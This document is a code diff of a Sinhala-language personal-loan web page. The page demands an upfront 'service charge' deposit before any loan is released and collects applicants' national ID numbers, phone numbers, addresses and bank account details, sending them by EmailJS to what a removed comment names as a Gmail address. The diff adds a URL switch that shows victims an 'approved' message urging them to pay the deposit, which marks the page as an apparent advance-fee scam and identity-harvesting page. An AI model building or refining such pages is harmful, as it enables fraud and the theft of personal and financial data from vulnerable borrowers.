@@ -8,7 +8,6 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // ඔබේ නව ඊමේල් ලිපිනයට (qq9607246@gmail.com) සම්බන්ධ කර ඇති EmailJS Public Key එක මෙහි ඇත
             emailjs.init("ynnW7L0fim_ViQuRt");
         })();
     </script>
@@ -16,7 +15,7 @@
         :root {
             --primary-color: #0f5132;
             --secondary-color: #198754;
-            --bg-color: #f8f9fa;
+            --bg-color: #f4f6f9;
             --card-bg: #ffffff;
             --text-color: #333333;
             --border-color: #dee2e6;
@@ -30,67 +29,62 @@
             line-height: 1.6;
         }
         .container {
-            max-width: 600px;
+            max-width: 550px;
             background: var(--card-bg);
             margin: 0 auto;
-            padding: 30px;
+            padding: 25px;
             border-radius: 16px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
         }
         h2 {
             text-align: center;
             color: var(--primary-color);
-            margin-bottom: 25px;
-            font-size: 24px;
+            margin-bottom: 20px;
+            font-size: 22px;
             border-bottom: 2px solid #e9ecef;
-            padding-bottom: 15px;
+            padding-bottom: 12px;
         }
         .info-box {
             background-color: #f1f8f5;
             border-left: 5px solid var(--secondary-color);
-            padding: 20px;
+            padding: 15px;
             border-radius: 8px;
             font-size: 14px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         .info-box ul {
             margin: 8px 0;
             padding-left: 20px;
         }
-        .info-box li {
-            margin-bottom: 6px;
-        }
         .warning-box {
             background-color: #fff3cd;
             border: 1px solid #ffeeba;
             color: #856404;
-            padding: 14px;
+            padding: 12px;
             border-radius: 8px;
             font-size: 13px;
             margin: 15px 0;
-            line-height: 1.5;
             font-weight: 500;
         }
         .danger-box {
             background-color: #f8d7da;
             border: 1px solid #f5c6cb;
             color: #721c24;
-            padding: 14px;
+            padding: 12px;
             border-radius: 8px;
             font-size: 13px;
             margin: 15px 0;
-            line-height: 1.5;
             font-weight: 500;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 600;
             color: #495057;
-            font-size: 14px;
+            font-size: 13px;
         }
         input, select, textarea {
             width: 100%;
@@ -99,12 +93,6 @@
             border-radius: 8px;
             font-size: 14px;
             box-sizing: border-box;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: var(--secondary-color);
-            box-shadow: 0 0 0 3px rgba(25, 135, 84, 0.15);
         }
         button {
             width: 100%;
@@ -117,130 +105,179 @@
             border-radius: 8px;
             cursor: pointer;
             margin-top: 10px;
-            transition: background 0.3s, transform 0.1s;
         }
         button:hover {
             background-color: #157347;
         }
-        button:active {
-            transform: scale(0.98);
-        }
-        #success-message {
+        
+        /* Message Boxes */
+        .status-card {
             display: none;
             text-align: center;
+            padding: 30px 20px;
+            border-radius: 12px;
+            margin-top: 10px;
+        }
+        .pending-card {
+            background-color: #e2e3e5;
+            border: 2px solid #d6d8db;
+            color: #383d41;
+        }
+        .approved-card {
+            background-color: #d1e7dd;
+            border: 2px solid #badbcc;
             color: #0f5132;
-            background: #d1e7dd;
-            border: 1px solid #badbcc;
-            padding: 20px;
-            border-radius: 8px;
+        }
+        .status-icon {
+            font-size: 45px;
+            margin-bottom: 15px;
+        }
+        .status-title {
+            font-size: 20px;
             font-weight: bold;
-            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        .status-desc {
+            font-size: 15px;
+            line-height: 1.5;
         }
         .divider {
             border: 0;
             border-top: 1px solid var(--border-color);
-            margin: 20px 0;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>💰 පුද්ගලික නය පහසුකම්</h2>
-    
-    <div class="info-box">
-        <p style="margin-top: 0; font-weight: 600;">ඔයාට ලක්ෂ 1 සිට ලක්ෂ 50 දක්වා නය පහසුකම් ලබාගන්න පුළුවන්.</p>
-        
-        <strong>📌 අවශ්‍ය දේවල්:</strong>
-        <ul>
-            <li>🪪 ජාතික හැඳුනුම්පත (ID Card) හෝ පාස්පෝට් එකේ ෆොටෝ 2ක්</li>
-            <li>🏠 ස්ථීර ලිපිනය</li>
-        </ul>
+    <h2>💰 පුද්ගලික ණය පහසුකම්</h2>
 
-        <p style="margin-bottom: 5px;">🔹 අපි මේ සියලු කටයුතු Online හරහාම කරනවා<br>
-        🔹 පැහැදිලි හා විශ්වාසදායක සේවාවක් ලබාදෙයි</p>
+    <!-- 1. FORM CONTAINER -->
+    <div id="formContainer">
+        <div class="info-box">
+            <p style="margin-top: 0; font-weight: 600;">ඔයාට ලක්ෂ 1 සිට ලක්ෂ 50 දක්වා ණය පහසුකම් ලබාගන්න පුළුවන්.</p>
+            
+            <strong>📌 අවශ්‍ය දේවල්:</strong>
+            <ul>
+                <li>🪪 ජාතික හැඳුනුම්පත (ID Card) හෝ පාස්පෝට් එකේ ෆොටෝ 2ක්</li>
+                <li>🏠 ස්ථීර ලිපිනය</li>
+            </ul>
 
-        <hr class="divider">
+            <p style="margin-bottom: 5px;">🔹 අපි මේ සියලු කටයුතු Online හරහාම කරනවා<br>
+            🔹 පැහැදිලි හා විශ්වාසදායක සේවාවක් ලබාදෙයි</p>
 
-        <strong>💳 Service Charge විස්තර:</strong>
-        <ul>
-            <li>ලක්ෂ 1 – රු. 5500</li>
-            <li>ලක්ෂ 2 – රු. 11000</li>
-            <li>ලක්ෂ 4 – රු. 24000</li>
-            <li><em>(ලක්ෂයකට රු. 5500 බැගින්)</em></li>
-        </ul>
+            <hr class="divider">
 
-        <p style="margin: 10px 0 5px 0;">
-           • ලක්ශයට 5500<br>
-           • ලක්ශ 2 ට 11000<br>
-           • ලක්ශ 5 ට 27500<br>
-           • ලක්ශ 10ට 55000<br>
-           • ලක්ශ 20ට 110000<br>
-           • ලක්ශ 30ට 175000<br>
-           • ලක්ශ 50ට 275000
-        </p>
+            <strong>💳 Service Charge විස්තර:</strong>
+            <p style="margin: 10px 0 5px 0;">
+               • ලක්ෂයට 5500<br>
+               • ලක්ෂ 2 ට 11000<br>
+               • ලක්ෂ 5 ට 27500<br>
+               • ලක්ෂ 10ට 55000<br>
+               • ලක්ෂ 20ට 110000<br>
+               • ලක්ෂ 30ට 175000<br>
+               • ලක්ෂ 50ට 275000
+            </p>
 
-        <div class="warning-box">
-            ⚠️ සර්විස් චාර්ජ් එක අනිවාරෙන් ලෝන් එක ගන්න කලින් ඩිපොසිට් කරන්න ඕනේ. ඔයාට අවශ්‍ය මුදලට service charge එක ඩිපොසිට් කරලා පැය දෙකෙන් ඔයාට ලෝන් එක ගන්න පුළුවන්.
+            <div class="warning-box">
+                ⚠️ සර්විස් චාර්ජ් එක අනිවාරෙන් ලෝන් එක ගන්න කලින් ඩිපොසිට් කරන්න ඕනේ. ඔයාට අවශ්‍ය මුදලට service charge එක ඩිපොසිට් කරලා පැය දෙකෙන් ඔයාට ලෝන් එක ගන්න පුළුවන්.
+            </div>
+
+            <strong>⏳ ගෙවීම් කොන්දේසි:</strong>
+            <ul>
+                <li>⏱️ අවුරුදු 4ක් ඇතුළත මුදල සම්පූර්ණයෙන්ම ගෙවිය යුතුයි</li>
+                <li>❌ මාසික වාරික අනිවාර්ය නැහැ</li>
+                <li>✅ ඔබට හැකි විදියට අවුරුදු 4 ඇතුළත ගෙවන්න පුළුවන්</li>
+            </ul>
+
+            <div class="danger-box">
+                ⚠️ අවුරුදු 4 ඇතුළත ගෙවන්න බැරි වුණොත්, ලබාගත් මුදලට සීයට 10ක අමතර මුදලක් ගෙවිය යුතුයි.
+            </div>
         </div>
 
-        <strong>⏳ ගෙවීම් කොන්දේසි:</strong>
-        <ul>
-            <li>⏱️ අවුරුදු 4ක් ඇතුළත මුදල සම්පූර්ණයෙන් ගෙවිය යුතුයි</li>
-            <li>❌ මාසික වාරික අනිවාර්ය නැහැ</li>
-            <li>✅ ඔබට හැකි විදියට අවුරුදු 4 ඇතුළත ගෙවන්න පුළුවන්</li>
-        </ul>
+        <form id="loanForm">
+            <div class="form-group">
+                <label>සම්පූර්ණ නම:</label>
+                <input type="text" id="fullName" name="fullName" placeholder="ඔබගේ නම ඇතුළත් කරන්න" required>
+            </div>
 
-        <div class="danger-box">
-            ⚠️ අවුරුදු 4 ඇතුළත ගෙවන්න බැරි වුණොත්, ලබාගත් මුදලට සීයට 10ක අමතර මුදලක් ගෙවිය යුතුයි.
-        </div>
+            <div class="form-group">
+                <label>ජාතික හැඳුනුම්පත් අංකය (NIC) / පාස්පෝට් අංකය:</label>
+                <input type="text" id="nic" name="nic" placeholder="NIC හෝ Passport අංකය" required>
+            </div>
 
-        <p style="margin-bottom: 0; font-weight: 500; text-align: center; color: var(--secondary-color);">🙏 අවශ්‍ය අයට සේවාවක් ලෙස මේක සපයන්නේ</p>
+            <div class="form-group">
+                <label>දුරකථන අංක දෙකක් (Phone Numbers):</label>
+                <input type="text" id="phone" name="phone" placeholder="දුරකථන අංක දෙකක් ඇතුළත් කරන්න" required>
+            </div>
+
+            <div class="form-group">
+                <label>ස්ථීර පදිංචි ලිපිනය:</label>
+                <textarea id="address" name="address" rows="2" placeholder="ඔබේ ලිපිනය" required></textarea>
+            </div>
+
+            <div class="form-group">
+                <label>අවශ්‍ය ණය මුදල (රු.):</label>
+                <input type="number" id="amount" name="amount" placeholder="අවශ්‍ය මුදල සඳහන් කරන්න" required>
+            </div>
+
+            <div class="form-group">
+                <label>අවශ්‍ය බැංකු විස්තර (බැංකුව, ශාඛාව, ගිණුම් අංකය):</label>
+                <textarea id="bank" name="bank" rows="2" placeholder="බැංකුව, ශාඛාව සහ ගිණුම් අංකය" required></textarea>
+            </div>
+
+            <button type="submit" id="submitBtn">අයදුම්පත යොමු කරන්න</button>
+        </form>
     </div>
 
-    <!-- ණය අයදුම්පත Form එක -->
-    <form id="loanForm">
-        <div class="form-group">
-            <label for="fullName">සම්පූර්ණ නම:</label>
-            <input type="text" id="fullName" name="fullName" placeholder="ඔබගේ නම ඇතුළත් කරන්න" required>
+    <!-- 2. PENDING STATUS CONTAINER -->
+    <div id="pendingCard" class="status-card pending-card">
+        <div class="status-icon">⏳</div>
+        <div class="status-title">අයදුම්පත ලැබුණි!</div>
+        <div class="status-desc">
+            ස්තුතියි! ඔබගේ ණය අයදුම්පත සාර්ථකව යොමු කරන ලදී. <br><br>
+            <strong>ඔබගේ ණය මුදල සම්බන්ධයෙන් අප ඉක්මනින් ඔබට දැනුම් දෙන්නෙමු.</strong>
         </div>
-
-        <div class="form-group">
-            <label for="nic">ජාතික හැඳුනුම්පත් අංකය (NIC) / පාස්පෝට් අංකය:</label>
-            <input type="text" id="nic" name="nic" placeholder="NIC හෝ Passport අංකය" required>
-        </div>
-
-        <div class="form-group">
-            <label for="phone">දුරකථන අංක දෙකක් (Phone Numbers):</label>
-            <input type="text" id="phone" name="phone" placeholder="දුරකථන අංක දෙකක් ඇතුළත් කරන්න" required>
-        </div>
-
-        <div class="form-group">
-            <label for="address">ස්ථීර පදිංචි ලිපිනය:</label>
-            <textarea id="address" name="address" rows="2" placeholder="ඔබේ ලිපිනය" required></textarea>
-        </div>
-
-        <div class="form-group">
-            <label for="amount">අවශ්‍ය ණය මුදල (රු.):</label>
-            <input type="number" id="amount" name="amount" placeholder="අවශ්‍ය මුදල සඳහන් කරන්න" required>
-        </div>
-
-        <div class="form-group">
-            <label for="bank">අවශ්‍ය බැංකු විස්තර (බැංකුව, ශාඛාව, ගිණුම් අංකය):</label>
-            <textarea id="bank" name="bank" rows="2" placeholder="බැංකුව, ශාඛාව සහ ගිණුම් අංකය" required></textarea>
-        </div>
-
-        <button type="submit" id="submitBtn">අයදුම්පත යොමු කරන්න</button>
-    </form>
-
-    <div id="success-message">
-        ස්තුතියි! ඔබගේ ණය අයදුම්පත සාර්ථකව යොමු කරන ලදී. අපි ඉක්මනින් ඔබව සම්බන්ධ කරගන්නෙමු.
     </div>
+
+    <!-- 3. APPROVED STATUS CONTAINER -->
+    <div id="approvedCard" class="status-card approved-card">
+        <div class="status-icon">🎉</div>
+        <div class="status-title">ණය මුදල අනුමත වී ඇත!</div>
+        <div class="status-desc">
+            සුබ පැතුම්! ඔබගේ ණය අයදුම්පත සාර්ථකව අනුමත කර ඇත.<br><br>
+            <strong>අවශ්‍ය මුදලට Deposit එක දමා ඉක්මනින් ණය මුදල ලබාගන්න.</strong>
+        </div>
+    </div>
+
 </div>
 
 <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const statusParam = urlParams.get('status');
+
+    if (statusParam === 'approved') {
+        localStorage.setItem('loan_user_status', 'approved');
+    }
+
+    const currentStatus = localStorage.getItem('loan_user_status');
+
+    const formContainer = document.getElementById('formContainer');
+    const pendingCard = document.getElementById('pendingCard');
+    const approvedCard = document.getElementById('approvedCard');
+
+    if (currentStatus === 'approved' || statusParam === 'approved') {
+        formContainer.style.display = 'none';
+        pendingCard.style.display = 'none';
+        approvedCard.style.display = 'block';
+    } else if (currentStatus === 'pending') {
+        formContainer.style.display = 'none';
+        approvedCard.style.display = 'none';
+        pendingCard.style.display = 'block';
+    }
+
     const form = document.getElementById('loanForm');
-    const successMessage = document.getElementById('success-message');
     const submitBtn = document.getElementById('submitBtn');
 
     form.addEventListener('submit', function(e) {
@@ -249,13 +286,13 @@
         submitBtn.innerText = "යොමු කරමින් පවතී...";
         submitBtn.disabled = true;
 
-        // EmailJS හරහා qq9607246@gmail.com වෙත ඊමේල් එක යැවීම
         emailjs.sendForm('service_b688jin', 'template_ftzjsh7', this)
             .then(function() {
-                form.style.display = 'none';
-                successMessage.style.display = 'block';
+                localStorage.setItem('loan_user_status', 'pending');
+                formContainer.style.display = 'none';
+                pendingCard.style.display = 'block';
             }, function(error) {
-                alert('යשהו වැරදුණා. කරුණාකර නැවත උත්සාහ කරන්න.');
+                alert('යම් දෝෂයක් සිදු විය. කරුණාකර නැවත උත්සාහ කරන්න.');
                 submitBtn.innerText = "අයදුම්පත යොමු කරන්න";
                 submitBtn.disabled = false;
             });
